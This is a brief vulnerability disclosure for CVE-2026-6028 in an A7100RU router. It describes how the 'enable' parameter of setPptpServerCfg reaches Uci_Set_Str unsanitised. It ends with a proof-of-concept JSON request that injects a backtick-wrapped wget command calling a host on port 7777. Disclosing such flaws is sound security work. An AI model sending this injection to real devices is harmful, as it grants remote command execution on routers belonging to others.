# A7100RU Vulnerability（CVE-2026-6028）
...
In  sub_423A74 function, it reads in a user-provided parameter `enable` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
{"topicurl":"setPptpServerCfg","enable":"`wget 192.168.6.1:7777/testpoc`"
}
```
